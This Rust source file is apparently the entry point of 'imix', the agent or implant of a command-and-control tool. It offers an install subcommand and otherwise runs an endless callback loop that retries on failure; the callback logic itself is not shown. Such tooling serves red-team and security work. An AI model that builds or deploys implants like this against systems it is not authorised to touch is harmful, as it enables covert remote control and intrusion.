use anyhow::Result;
use clap::Command;
use imix::{Agent, Config};
use std::time::Duration;

#[tokio::main(flavor = "multi_thread", worker_threads = 128)]
async fn main() {
    #[cfg(debug_assertions)]
    init_logging();

    match Command::new("imix")
        .subcommand(Command::new("install").about("Install imix"))
        .get_matches()
        .subcommand()
    {
        Some(("install", _)) => {
            imix::install().await;
            return;
        }
        _ => {}
    }

    loop {
        let cfg = Config::default();
        let retry_interval = cfg.retry_interval;
        #[cfg(debug_assertions)]
        log::info!("agent config initialized {:#?}", cfg.clone());

        match run(cfg).await {
            Ok(_) => {}
            Err(_err) => {
                #[cfg(debug_assertions)]
                log::error!("callback loop fatal: {_err}");

                tokio::time::sleep(Duration::from_secs(retry_interval)).await;
            }
        }
    }
}

async fn run(cfg: Config) -> Result<()> {
    let mut agent = Agent::gen_from_config(cfg).await?;

    agent.callback_loop().await;
    Ok(())
}

#[cfg(debug_assertions)]
fn init_logging() {
    pretty_env_logger::formatted_timed_builder()
        .filter_level(log::LevelFilter::Info)
        .parse_env("IMIX_LOG")
        .init();
}
